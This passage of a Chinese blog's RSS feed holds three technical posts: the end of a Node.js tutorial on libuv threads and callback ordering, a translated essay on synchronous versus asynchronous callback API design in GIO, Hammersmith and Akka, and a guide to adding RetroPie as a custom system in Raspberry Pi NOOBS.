<span class="p">}</span>

<span class="nx">NODE_MODULE</span><span class="p">(</span><span class="nx">binding</span><span class="p">,</span> <span class="nx">Init</span><span class="p">);</span>
</pre></div>
</code></pre>
<p><strong>代码2.4</strong>  </p>
<blockquote>
<p>上述代码的编译参照<a href="http://git.oschina.net/yunnysunny/async-tutorial-code/blob/master/addon/readme.md">编译说明</a>，项目源码地址参加第3节。关于nan的使用，可以参照我的另一篇教程<a href="http://blog.whyun.com/posts/nan/">《nan基础教程》</a>。</p>
</blockquote>
<p>编写的测试代码，将其运行，就可以看出函数<code>Execute</code>根本就不在js线程中执行，也就是说它是可以和js线程并行的；函数<code>HandleOKCallback</code>中能够触发js中的回调函数，将处理完的结果交给js。下面就编译上面代码（需要node-gyp支持，执行<code>node-gpy rebuild</code>进行编译），来验证上述结论：  </p>
<pre><code><div class="highlight"><pre><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span><span class="nx">synchronizedCode</span><span class="p">(</span><span class="s1">&#39;timer1&#39;</span><span class="p">,</span><span class="mi">3</span><span class="p">);},</span><span class="mi">0</span><span class="p">);</span>
    <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;setTimeout 0 occured second.&#39;</span><span class="p">);},</span><span class="mi">0</span><span class="p">);</span>
    <span class="nx">process</span><span class="p">.</span><span class="nx">nextTick</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;nextTick occured.&#39;</span><span class="p">);});</span>

    <span class="kd">var</span> <span class="nx">addon</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;./addon/build/Release/binding&#39;</span><span class="p">);</span>
    <span class="nx">addon</span><span class="p">.</span><span class="nx">async_hello</span><span class="p">(</span><span class="s2">&quot;good&quot;</span><span class="p">,</span><span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">result</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;node addon result&#39;</span><span class="p">,</span><span class="nx">result</span><span class="p">);</span>
    <span class="p">});</span>

    <span class="nx">setImmediate</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;setImmediate occured.&#39;</span><span class="p">)});</span>

    <span class="kd">var</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;crypto&#39;</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">rand</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">pseudoRandomBytes</span><span class="p">(</span><span class="mi">8</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">);</span>
    <span class="nx">fs</span><span class="p">.</span><span class="nx">mkdir</span><span class="p">(</span><span class="s1">&#39;d:\\temp\\xx&#39;</span><span class="o">+</span><span class="s1">&#39;\\&#39;</span><span class="o">+</span><span class="nx">rand</span><span class="p">,</span><span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="s1">&#39;错误&#39;</span><span class="p">,</span><span class="nx">err</span><span class="p">.</span><span class="nx">code</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;create directory success.&#39;</span><span class="p">);</span>
        <span class="p">}</span>        
    <span class="p">});</span>

    <span class="nx">synchronizedCode</span><span class="p">();</span>
<span class="p">})();</span>  
</pre></div>
</code></pre>
<p><strong>代码2.5</strong><br>我们在代码2.5中引入了代码2.4中的c++扩展，其输出内容如下</p>
<pre><code><div class="highlight"><pre><span class="nx">async_hello</span> <span class="nx">Thread</span> <span class="nx">id</span> <span class="o">:</span> <span class="nx">gettid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">284953360</span>

<span class="nx">call_work</span> <span class="nx">Thread</span> <span class="nx">id</span> <span class="o">:</span> <span class="nx">gettid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">284958096</span>
<span class="nx">sleep</span> <span class="mi">1</span> <span class="nx">seconds</span> <span class="k">in</span> <span class="nx">uv_work</span>
<span class="nx">sleep</span> <span class="mi">1</span> <span class="nx">seconds</span> <span class="k">in</span> <span class="nx">uv_work</span>
<span class="nx">the</span> <span class="mi">1</span><span class="nx">th</span> <span class="nx">count</span><span class="p">.</span>
<span class="nx">sleep</span> <span class="mi">1</span> <span class="nx">seconds</span> <span class="k">in</span> <span class="nx">uv_work</span>
<span class="nx">sleep</span> <span class="mi">1</span> <span class="nx">seconds</span> <span class="k">in</span> <span class="nx">uv_work</span>
<span class="nx">the</span> <span class="mi">2</span><span class="nx">th</span> <span class="nx">count</span><span class="p">.</span>
<span class="nx">sleep</span> <span class="mi">1</span> <span class="nx">seconds</span> <span class="k">in</span> <span class="nx">uv_work</span>
<span class="nx">sleep</span> <span class="mi">1</span> <span class="nx">seconds</span> <span class="k">in</span> <span class="nx">uv_work</span>
<span class="nx">the</span> <span class="mi">3</span><span class="nx">th</span> <span class="nx">count</span><span class="p">.</span>
<span class="nx">sleep</span> <span class="mi">1</span> <span class="nx">seconds</span> <span class="k">in</span> <span class="nx">uv_work</span>
<span class="nx">sleep</span> <span class="mi">1</span> <span class="nx">seconds</span> <span class="k">in</span> <span class="nx">uv_work</span>
<span class="nx">the</span> <span class="mi">4</span><span class="nx">th</span> <span class="nx">count</span><span class="p">.</span>
<span class="nx">sleep</span> <span class="mi">1</span> <span class="nx">seconds</span> <span class="k">in</span> <span class="nx">uv_work</span>
<span class="nx">sleep</span> <span class="mi">1</span> <span class="nx">seconds</span> <span class="k">in</span> <span class="nx">uv_work</span>
<span class="nx">the</span> <span class="mi">5</span><span class="nx">th</span> <span class="nx">count</span><span class="p">.</span>
<span class="nx">exist</span> <span class="k">while</span><span class="p">.</span>
<span class="nx">nextTick</span> <span class="nx">occured</span><span class="p">.</span>
<span class="nx">sleep</span> <span class="mi">1</span> <span class="nx">seconds</span> <span class="k">in</span> <span class="nx">uv_work</span>
<span class="nx">sleep</span> <span class="mi">1</span> <span class="nx">seconds</span> <span class="k">in</span> <span class="nx">uv_work</span>
<span class="nx">the</span> <span class="mi">1</span><span class="nx">th</span> <span class="nx">count</span> <span class="k">in</span> <span class="p">[</span><span class="nx">timer1</span><span class="p">].</span>
<span class="nx">sleep</span> <span class="mi">1</span> <span class="nx">seconds</span> <span class="k">in</span> <span class="nx">uv_work</span>
<span class="nx">sleep</span> <span class="mi">1</span> <span class="nx">seconds</span> <span class="k">in</span> <span class="nx">uv_work</span>
<span class="nx">the</span> <span class="mi">2</span><span class="nx">th</span> <span class="nx">count</span> <span class="k">in</span> <span class="p">[</span><span class="nx">timer1</span><span class="p">].</span>
<span class="nx">sleep</span> <span class="mi">1</span> <span class="nx">seconds</span> <span class="k">in</span> <span class="nx">uv_work</span>
<span class="nx">the</span> <span class="mi">3</span><span class="nx">th</span> <span class="nx">count</span> <span class="k">in</span> <span class="p">[</span><span class="nx">timer1</span><span class="p">].</span>
<span class="nx">the</span> <span class="mi">4</span><span class="nx">th</span> <span class="nx">count</span> <span class="k">in</span> <span class="p">[</span><span class="nx">timer1</span><span class="p">].</span>
<span class="nx">exist</span> <span class="k">while</span> <span class="k">in</span> <span class="p">[</span><span class="nx">timer1</span><span class="p">].</span>
<span class="nx">setTimeout</span> <span class="mi">0</span> <span class="nx">occured</span> <span class="nx">second</span><span class="p">.</span>
<span class="nx">setImmediate</span> <span class="nx">occured</span><span class="p">.</span>
<span class="nx">create</span> <span class="nx">directory</span> <span class="nx">success</span><span class="p">.</span>

<span class="nx">call_work_after</span> <span class="nx">Thread</span> <span class="nx">id</span> <span class="o">:</span> <span class="nx">gettid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">284953360</span>
<span class="nx">node</span> <span class="nx">addon</span> <span class="nx">result</span> <span class="nx">good</span><span class="o">---&gt;</span><span class="nx">hello</span> <span class="nx">world</span> <span class="nx">from</span> <span class="nx">c</span><span class="o">++</span>
</pre></div>
</code></pre>
<p><strong>输出2.5</strong><br>我们终于看到开篇提到的类似java代码的交叉输出的效果了。libuv在处理任务时根本就和js不在一个线程中，所以才出现了libuv线程和js线程交叉输出的效果。我们在梳理一下代码2.5的异步流程，那么可以用下面这个图来展示出来：<br><img src="http://blog.whyun.com/images/js_frame3.png" alt=""><br><strong>图2.3</strong><br>在node中维护了一个回调的队列，那为什么调用插件的回调排在队列的最后面呢，是有于我们在代码2.4中故意将其代码设置成15秒之后才执行完成，这要远远长于其他的那些回调，所以它只能被追加到回调队列的最后一位。在第二帧中，node中的事件轮询依次将这些回调队列中的任务取出来，进行触发调用。可以看出回调队列是个先进先出的结构。注意回调是按照队列中排队顺序执行的，同时它们执行的环境是js线程，要知道js线程可是个单线程，也就是说一旦某个回调中的同步代码耗时比较长，那么它后面的回调任务就得一直等着它运行完成，所以说一定不要在回调中写特别耗时的同步代码。</p>
<h2><a name="3" class="anchor" href="#3"><span class="header-link"></span></a>3. 代码</h2>
<p>本文用到代码发布在<a href="http://git.oschina.net/yunnysunny/async-tutorial-code"><a href="http://git.oschina.net/yunnysunny/async-tutorial-code">http://git.oschina.net/yunnysunny/async-tutorial-code</a></a></p>
]]></description><link>http://blog.whyun.com/posts/js/</link><guid isPermaLink="true">http://blog.whyun.com/posts/js/</guid><dc:creator><![CDATA[白一梓]]></dc:creator><pubDate>Fri, 20 Mar 2015 00:00:00 GMT</pubDate></item><item><title><![CDATA[同步和异步回调]]></title><description><![CDATA[<h1><a name="" class="anchor" href="#"><span class="header-link"></span></a>同步和异步回调</h1>
<p><em>作者：havoc (原文地址：<a href="http://blog.ometer.com/2011/07/24/callbacks-synchronous-and-asynchronous/"><a href="http://blog.ometer.com/2011/07/24/callbacks-synchronous-and-asynchronous/">http://blog.ometer.com/2011/07/24/callbacks-synchronous-and-asynchronous/</a></a>)</em></p>
<p>这里讲两个使用callback设计API的指南，并且添加到我的杂记<a href="http://blog.ometer.com/2011/01/20/boolean-parameters-are-wrong/" title="作者显然是贴错地址了，译者注">posts about minor API design points</a>中。我之前多次在不同的场合发起过关于“sync vs. async”回调的问题。这个问题着实困扰着API设计者和使用者。<br>最近，这个问题在我处理<a href="https://github.com/bwmcadams/hammersmith">Hammersmith</a>（一个基于callback回调的MongoDB的Scale API）又被提起。我认为这（这里指基于回调的API，译者注）对大量的JVM代码编写者来说稍微有些 <em>不习惯（new consideration）</em> ，因为传统的JVM使用堵塞API和线程。对于我来说，已经很熟悉编写基于<a href="https://developer.gnome.org/glib/unstable/glib-The-Main-Event-Loop.html">事件循环</a>的客户端代码。</p>
<h2><a name="" class="anchor" href="#"><span class="header-link"></span></a>介绍</h2>
<ul>
<li>一个<strong>同步（synchronous）</strong>回调在函数返回之前执行，也就是说， <em>当API在调用时callback也处在上下文中(这句话的原文是：while the API receiving the callback remains on the stack)</em> 。例子可以是这样的：<code>list.foreach(callback);</code>在<code>foreach()</code>返回时，你可以预期到callback已经在所有元素上都被执行了。</li>
<li><p>一个<strong>异步（asynchronous）</strong>或者<strong>延迟（deferred）</strong>回调，在函数返回之后执行，或者至少在另一个线程的栈空间中执行。延迟（deferral）的架构包括线程和主循环【main loops】(其他名字包括event loops,dispatchers,executors)。异步回调在IO相关的API中很流行，例如<code>socket.connect(callback);</code>，你会预期在<code>connect（）</code>返回时，callback可能还没有被调用，因为他正在等待连接建立完毕。</p>
<h2><a name="" class="anchor" href="#"><span class="header-link"></span></a>指南</h2>
<p>基于过往经验，我使用这两条规则：</p>
</li>
<li><p>给出的回调不能一直是同步的或者异步的，而是应该将其作为API文档的一部分加以说明。</p>
</li>
<li>异步回调需要被主循环中或者 <em>中心分发组件（central dispatch mechanism）</em> 直接调用，也就是说，别在回调执行的栈中存在非必须的代码块，特别是这些代码块可能含有锁的时候。</li>
</ul>
<h2><a name="" class="anchor" href="#"><span class="header-link"></span></a>同步回调和异步回调有啥不同？</h2>
<p>同步和异步回调对于包括app和类库在内的开发者造成问题是不一样的。<br>同步回调：</p>
<ul>
<li>在 <em>原始（original）</em> 线程中执行（触发回调和回调执行是一个线程，这里原始线程被指做回调触发的线程，译者注），所以自身不需要关心线程安全。</li>
<li>在类C/C++语言中，可以读取存储在栈上的数据，比如说本地变量。</li>
<li>在任一语言中，他们可以访问绑定到当前线程上的数据，比如说thread-local类型变量。比如许多java web框架在当前事务或者请求中创建thread-local类型的变量。</li>
<li><p>可以假定某些应用程序的状态不变，比如说对象存在、定时器没有被触发、IO访问没有发生，或者任一一个程序关联的结构的状态。
异步回调：</p>
</li>
<li><p>可能会在另一个线程（在基于线程的异步架构中）中被调用，所以应用需要使回调同步访问的任意一个资源。</p>
</li>
<li>不能访问任意一个 <em>原始</em> 堆栈或者线程，比如说局部变量或者thread-local类型数据。</li>
<li>如果 <em>原始</em> 线程中持有锁，那么回调应在锁的外面被调用。</li>
<li>需要假定其他的线程或者事件可能已经修改了应用程序的状态。</li>
</ul>
<p>不能说哪个回调方式更好，都有其优点。试想一下：<br><code>list.foreach(callback)</code><br>大多数情况下，如果callback被延迟调用并且在当前线程中没有做任何操作，你可能会十分惊讶。<br>但是：<br><code>socket.connect(callback)</code><br>如果不延迟调用callback就显得完全没有意义了，为啥要设置一个callback呢？<br>这两个例子告诉我们为什么一个给出的回调要被定义为同步或者异步，它们是不可以互换的，同时也拥有不同的用途。</p>
<h2><a name="" class="anchor" href="#"><span class="header-link"></span></a>选择同步或者异步，但是不能同时使用</h2>
<p>显而易见，可能在某些场景中需要立即执行回调（当数据已经准备好了情况），在另外一些场景回调需要延迟调用（socket没有准备好的情况）。一个很诱人的做法是，在可能的情况下同步执行回调，在另外的情况的异步执行。但是不是一个好想法。<br>因为同步和异步拥有不同的规则，他们产生不同的bug。在测试环境下触发异步回调，但是生产环境的某些不常见场景下，按照同步来运行了，是很典型的。<br>要求应用程序开发者同时对同步和异步情况进行规划和测试是很困难的，所以最简单的就是用库函数来实现：<strong>如果一个回调在某些情况下延迟支持，那么一直使用延迟的方式</strong>。</p>
<h2><a name="gio" class="anchor" href="#gio"><span class="header-link"></span></a>例子：GIO</h2>
<p>在GIO库中的<a href="http://developer.gnome.org/gio/unstable/GSimpleAsyncResult.html">GSimpleAsyncResult文档</a>有一个针对当前问题的典型例子，直接滑过描述章节，看异步烘烤蛋糕的例子。（GSimpleAsyncResult可以等同于一些框架中的future或者promise。）这个类中提供了两个方法， <a href="http://developer.gnome.org/gio/unstable/GSimpleAsyncResult.html#g-simple-async-result-complete-in-idle">complete_in_idle() </a>函数将回调交由一个“空闲句柄”（ <em>是一个立即调度的一次性事件循环，原文是：just an immediately-dispatched one-shot main loop event</em> ）来延迟调用；普通的<a href="http://developer.gnome.org/gio/unstable/GSimpleAsyncResult.html#g-simple-async-result-complete">complete()</a>函数同步触发回调。文档中建议，尽量使用complete_in_idle()，除非你知道你已经处在一个没有持有任何锁的回调中（也就是说，你正好处在从一个异步回调到另一个函数的调用链上，那就没有必要再做异步处理了）。  </p>
<p>GSimpleAsyncResult旨在实现类似于<a href="http://developer.gnome.org/gio/unstable/GFile.html#g-file-read-async" title=" g_file_read_async()">g_file_read_async()</a>这种IO API，开发者可以假定所有使用这些API的回调都是异步的。</p>
<p>GIO使用这种方式并且在文档中强制声明出来，因为开发者开发的时候曾经（因为文档不明确，译者注）备受煎熬。</p>
<h2><a name="" class="anchor" href="#"><span class="header-link"></span></a>同步资源需要延迟运行所有它们触发的回调函数</h2>
<p>事实上，这个规则是说，一个类库需要在回调触发之前释放掉它持有的所有锁。释放掉所有锁的最简单的方式就是使回调异步，延迟调用它直到上下文回到主循环或者在另一个线程的上下文中调用它。(也就是说在当前上下文环境中所有代码——包括释放掉锁的代码——执行完毕，然后才在主循环或者另一线程中执行回调，译者注)</p>
<p>这一点很重要，因为不能预计到应用程序不在回调内部接触你的API。如果你持有锁并且程序（在回调内部，译者注）接触到了你的API，程序就会死锁。（或者如果你使用递归锁，你同样会遇到可怕的问题。）</p>
<p>与其将回调延迟到主循环或者线程中，同步的资源可以尝试释放掉它所有的锁；但是他是<strong>非常</strong>痛苦的，因为锁可能恰好在上下文中，你最终需要使每个上下文中的函数返回回调函数，将回调函数一直留存给最外部锁的持有者，然后释放掉锁并且触发回调。呸。</p>
<h2><a name="akkahammersmith" class="anchor" href="#akkahammersmith"><span class="header-link"></span></a>例子：不使用Akka的Hammersmith</h2>
<p>在前面提到的Hammersmith中，下面给出的伪码会产生死锁：</p>
<pre><code><div class="highlight"><pre><span class="nx">connection</span><span class="p">.</span><span class="nx">query</span><span class="p">({</span> <span class="nx">cursor</span> <span class="o">=&gt;</span> <span class="cm">/* iterate cursor here, touching connection again */</span> <span class="p">})</span>
</pre></div>
</code></pre>
<p>遍历游标时会反过来访问MongoDB的connection。在connection对象的代码中触发query的回调函数...，而这个connection对象还持有连接锁。虽然不能正常工作，但是这种代码对于开发者来说是很顺手的。如果一个类库不延迟调用回调函数，应用开发者需要自己延迟调用它。大多数应用开发者在开始的时候都会出错，一旦他们捕获到错误并且修正，他们的代码就会被一些异步架构搞的乱七八糟。</p>
<p>Hammersmith从Netty中继承了这个问题，Netty也是这样使用connection的；Netty没有试图去延迟调用回调函数（我可以立即这种行为，毕竟在java中没有一个明确的 默认/标准/通用/有效 方式来延迟调用回调函数）。</p>
<p>起初，我对它的修正是添加<a href="https://github.com/havocp/hammersmith/commit/48c6d4b486357d9af17bf4ee5f8042a4944c41bf">一个线程池来运行程序的回调</a>。不幸的是，这个推荐的和Netty一起使用的线程池类并没有解决死锁问题，<a href="https://github.com/havocp/hammersmith/commit/16fb3103851af00d6aa7780c182169e68c41aa45">我只能接着修复它</a>。（所有解决死锁问题的线程池都得拥有无限的容量和资源……）</p>
<p>最终它终于能用了，但是想想一下，如果基于回调的API流行起来之后，每个jar包你都在它的API中使用回调函数，那么就必须拥有一个线程池。想想也是醉了。这很有可能就是为啥Netty在这个问题上要赌一把。在一个底层网络类库上太难做策略控制了。</p>
<h2><a name="akka-actor" class="anchor" href="#akka-actor"><span class="header-link"></span></a>例子：AKKA Actor</h2>
<p>部分由于要寻找一个更有的解决方案，之后我将<a href="https://github.com/bwmcadams/hammersmith">Hammersmith</a> 迁移到 <a href="http://akka.io/">Akka</a> 上来。Akka实现了<a href="https://zh.wikipedia.org/wiki/%E5%8F%83%E8%88%87%E8%80%85%E6%A8%A1%E5%BC%8F">Actor模式</a>。Actor是基于消息而不是基于回调的，一般来说消息还<strong>必须</strong>得是延迟发送的。事实上，Akka还特意强制你使用一个<a href="http://akka.io/api/akka/snapshot/akka/actor/ActorRef.html">ActorRef</a>用来和actor进行通信，所有关联ActoRref的消息都经过一个dispatcher（事件循环）。假定你有两个actor进行通信，他们将使用<code>!</code>或者“发送消息”函数：</p>
<pre><code><div class="highlight"><pre><span class="nx">actorOne</span> <span class="o">!</span> <span class="nx">Request</span><span class="p">(</span><span class="s2">&quot;Hello&quot;</span><span class="p">)</span>
<span class="c1">// then in actorOne</span>
<span class="nx">sender</span> <span class="o">!</span> <span class="nx">Reply</span><span class="p">(</span><span class="s2">&quot;World&quot;</span><span class="p">)</span>
</pre></div>
</code></pre>
<p>这些消息都通过事件循环进行分发的。我希望我的死锁问题能够在这种模式下得到解决，但是我在调用带有锁的回调函数时，还是遇到了小麻烦——同样的问题又被触发了。这次的锁是在actor处理消息时锁住actor本身。</p>
<p>Akka中的actor可以从其他actor或者从<code>Future</code>中接收消息，Akka将发送者封装在一个称作<code>Channel</code>的对象中。通过<code>!</code>来发送消息到一个actor时，就会将这个消息交给dispather来做延迟，但是发送到future就不会；因此，在API约定上，<code>Channel</code>上的<code>!</code>方法并没有决定是当前是使用同步还是异步。</p>
<p>那么问题来了，actor模式中的一个重点就是一个actor在同一时间内仅仅只能运行在一个线程中；actor在处理某个消息的时候是不允许另一个消息再进入的。因此，在actor外部产生同步调用是很危险的；在actor上有锁，如果同步调用时试图在回调中再次使用actor本身，就会产生死锁。</p>
<p>我将MongoDB connection包装成一个actor，立马就重现了和Netty中同样的死锁问题，也就是在query的回调中试图在遍历游标的时候再次访问connection。query的回调是由<code>!</code>方法在发送到future上时触发的。这个<code>Channel</code>上的<code>!</code>方法打破了我的第一条原则（它没有在API约定上定义成同步或者异步），但是我期望它能够一直都是异步的；结果我还意外的打破了我的第二条原则，触发回调时还持有锁。</p>
<p>如果是我，我将在API约定中吧<code>Channel.!</code>置为延迟，来修正这个问题；但是，正如Akka写的那样，如果你实现这样一个actor，发送回复，并且你程序的回复处理句柄想反回来重新使用actor本身，你必须手动延迟发送这些回复。我偶然间发现了这个实现方式，然而应该还有一个更好的实现方式：</p>
<pre><code><div class="highlight"><pre><span class="kr">private</span> <span class="nx">def</span> <span class="nx">asyncSend</span><span class="p">(</span><span class="nx">channel</span><span class="o">:</span> <span class="nx">AkkaChannel</span><span class="p">[</span><span class="nx">Any</span><span class="p">],</span> <span class="nx">message</span><span class="o">:</span> <span class="nx">Any</span><span class="p">)</span> <span class="o">=</span> <span class="p">{</span>
    <span class="nx">Future</span><span class="p">(</span><span class="nx">channel</span> <span class="o">!</span> <span class="nx">message</span><span class="p">,</span> <span class="nx">self</span><span class="p">.</span><span class="nx">timeout</span><span class="p">)(</span><span class="nx">self</span><span class="p">.</span><span class="nx">dispatcher</span><span class="p">)</span>
<span class="p">}</span>
</pre></div>
</code></pre>
<p>这个解决方案令人不爽的地方是，为了将回复交给future做异步处理，那么对于actor的回复就是两次异步了。</p>
<p>还好，对于Akka来说至少它<strong>拥有</strong>解决方案——使用dispatcher。如果使用纯Netty，我就不得不使用一个专门的线程池了。</p>
<p>Akka给出了“如何是回调异步”的答案，但是它还需要一些特殊用途的（special-casing）future来保证它们确实是异步的。<br>（<strong>更新：</strong>Akka团队已经准备解决这个问题，<a href="https://www.assembla.com/spaces/akka/tickets/1054-complete-futures-asynchronously-when-replying-through-a-channel">详情查看</a>。）</p>
<h2><a name="" class="anchor" href="#"><span class="header-link"></span></a>总结</h2>
<p>相对于我发现的Akka的小麻烦，没有使用Akka的JVM环境下的情况将会更糟，因为这时是没有一个dispatcher可供使用的。<br><strong>基于回调的API在有事件循环的时候会运行的很好</strong> ，因为拥有异步触发回调的功能是很重要的。<br>这也就是为啥在客户端javascript和<a href="http://nodejs.org/">node.js</a>还有类似于<a href="http://www.gtk.org/">GTK+</a>的UI组件库中回调运行的很完美。但是如果你在JVM中开始编写基于回调的API，就是没有默认解决方案的。你不得不借鉴一些事件循环类库（Akka工作的很好），或者重新造轮子，或者随处使用线程池。</p>
<p>鉴于基于回调的API如此的时髦……如果你准备写一个，我想前面的这个话题你也会遇到。打完收工。</p>
]]></description><link>http://blog.whyun.com/posts//</link><guid isPermaLink="true">http://blog.whyun.com/posts//</guid><dc:creator><![CDATA[白一梓]]></dc:creator><pubDate>Wed, 18 Feb 2015 00:00:00 GMT</pubDate></item><item><title><![CDATA[NOOBS安装自定义系统]]></title><description><![CDATA[<h2><a name="" class="anchor" href="#"><span class="header-link"></span></a>简介</h2>
<p>前段时间折腾了一下树莓派，树莓派的操作系统安装时需要自己烧录img文件到SD卡中。烧录SD卡大体分为两种方式一种是吧一个img文件烧录到整张卡中，另一种是通过NBOOBS将多个img文件烧录到一张卡中。前者在windows下通过Win32DiskImager这个软件就能轻松的做到，后者需要使用到NBOOBS，下载地址：<a href="http://downloads.raspberrypi.org/NOOBS_latest">http://downloads.raspberrypi.org/NOOBS_latest</a> 。</p>
<p>NOOBS提供多个操作系统共存的方案，他提供了一个图形化的安装界面，在安装过程中读取定义好的配置文件，来选择要安装的各个系统。通过上文提到的下载地址下载回来的NOOBS，里面只预置了Raspbian这个系统，但是我们想安装一些自定义的系统改怎么办呢？这就是本文要解决的问题。</p>
<h2><a name="" class="anchor" href="#"><span class="header-link"></span></a>实现</h2>
<p>关于添加自定义操作系统的问题，在NOOBS的github文档上也是有说明的，详见<a href="https://github.com/raspberrypi/noobs#how-to-create-a-custom-os-version">这里</a>。假设我们现在要安装<a href="http://blog.petrockblock.com/retropie/">RetroPie</a>这个系统，我们首先从<a href="http://blog.petrockblock.com/download/retropie-project-image/">官方地址</a>上把它下载下来。根据github上提到的教程，那么制作NOOBS系统就应该是下面几步。</p>
<ol>
<li>下载NOOBS.</li>
<li>解压下载后的文件。</li>
<li>进入<code>os</code>文件夹。</li>
<li>选择其中的一个子文件，拷贝一份新的。这里就拿Raspbin这个文件夹开刀。拷贝完成后，将文件夹改名RetroPie，现在目录下的文件结构如下：</li>
</ol>
<p><img src="http://blog.whyun.com/images/noobs_os_dir.jpg" alt="noobs的os文件夹文件列表"><br>下面要依次讲解各个文件的作用。
5. 好，现在我们修改RetroPie文件夹下的os.json文件，这里面定义的数据将会在安装的时候显示为操作系统的标题和描述等信息。我大体上将其改为如下形式：</p>
<pre><code><div class="highlight"><pre>    <span class="p">{</span>
      <span class="s2">&quot;name&quot;</span><span class="o">:</span> <span class="s2">&quot;retropie&quot;</span><span class="p">,</span>
      <span class="s2">&quot;version&quot;</span><span class="o">:</span> <span class="s2">&quot;2.3&quot;</span><span class="p">,</span>
      <span class="s2">&quot;release_date&quot;</span><span class="o">:</span> <span class="s2">&quot;2014-05-31&quot;</span><span class="p">,</span>
      <span class="s2">&quot;kernel&quot;</span><span class="o">:</span> <span class="s2">&quot;3.12&quot;</span><span class="p">,</span>
      <span class="s2">&quot;description&quot;</span><span class="o">:</span> <span class="s2">&quot;The RetroPie Project started with the idea of turning the Raspberry Pi into a retro-gaming console and evolved ever since.&quot;</span><span class="p">,</span>
      <span class="s2">&quot;url&quot;</span><span class="o">:</span> <span class="s2">&quot;http://blog.petrockblock.com/retropie/&quot;</span><span class="p">,</span>
      <span class="s2">&quot;username&quot;</span><span class="o">:</span> <span class="s2">&quot;pi&quot;</span><span class="p">,</span>
      <span class="s2">&quot;password&quot;</span><span class="o">:</span> <span class="s2">&quot;raspberry&quot;</span><span class="p">,</span>
      <span class="s2">&quot;feature_level&quot;</span><span class="o">:</span> <span class="mi">123900</span>
    <span class="p">}</span>
</pre></div>
</code></pre>
<p><strong>配置文件2.1 os.json</strong></p>
<p>其中<code>name</code>肯定就是名称了，然后是<code>version</code>版本，<code>description</code>描述等信息。<br>同时，我们留意到文件<code>flavours.json</code>中的内容和<code>os</code>中很多重复，可以称作是<code>os.json</code>的简版，这个文件最终要被引导程序读取，显示引导菜单，供给用户选择安装哪些操作系统。注意由于我们的文件夹是复制产生的，所以这个文件也要相应的修改，否则引导菜单发现了两个一模一样的操作系统名称，就会忽略掉其中一个，这样你辛辛苦苦做出来的引导就不管用了。<br>6. 【可选】你可以放一个RetroPie.png来定义一下当前操作系统的logo。<br>7. 【可选】你可以在文件夹<code>slides_vga</code>中放一下说明性的图片，他会在安装过程中当成幻灯片播放出来。<br>8. 这一步是进行分区文件配置，先把做好的分区文件<code>partitions.json</code>贴出来：</p>
<pre><code><div class="highlight"><pre><span class="p">{</span>
  <span class="s2">&quot;partitions&quot;</span><span class="o">:</span> <span class="p">[</span>
    <span class="p">{</span>
      <span class="s2">&quot;label&quot;</span><span class="o">:</span> <span class="s2">&quot;boot&quot;</span><span class="p">,</span>
      <span class="s2">&quot;filesystem_type&quot;</span><span class="o">:</span> <span class="s2">&quot;FAT&quot;</span><span class="p">,</span>
      <span class="s2">&quot;partition_size_nominal&quot;</span><span class="o">:</span> <span class="mi">60</span><span class="p">,</span>
      <span class="s2">&quot;want_maximised&quot;</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
      <span class="s2">&quot;uncompressed_tarball_size&quot;</span><span class="o">:</span> <span class="mi">11</span><span class="p">,</span>
      <span class="s2">&quot;mkfs_options&quot;</span><span class="o">:</span> <span class="s2">&quot;-F 32&quot;</span>
    <span class="p">},</span>
    <span class="p">{</span>
      <span class="s2">&quot;label&quot;</span><span class="o">:</span> <span class="s2">&quot;root&quot;</span><span class="p">,</span>
      <span class="s2">&quot;filesystem_type&quot;</span><span class="o">:</span> <span class="s2">&quot;ext4&quot;</span><span class="p">,</span>
      <span class="s2">&quot;partition_size_nominal&quot;</span><span class="o">:</span> <span class="mi">2700</span><span class="p">,</span>
      <span class="s2">&quot;want_maximised&quot;</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
      <span class="s2">&quot;mkfs_options&quot;</span><span class="o">:</span> <span class="s2">&quot;-O ^huge_file&quot;</span><span class="p">,</span>
      <span class="s2">&quot;uncompressed_tarball_size&quot;</span><span class="o">:</span> <span class="mi">2203</span>
    <span class="p">}</span>
  <span class="p">]</span>
<span class="p">}</span>
</pre></div>
</code></pre>
<p><strong>配置文件2.2 partitions.json</strong></p>
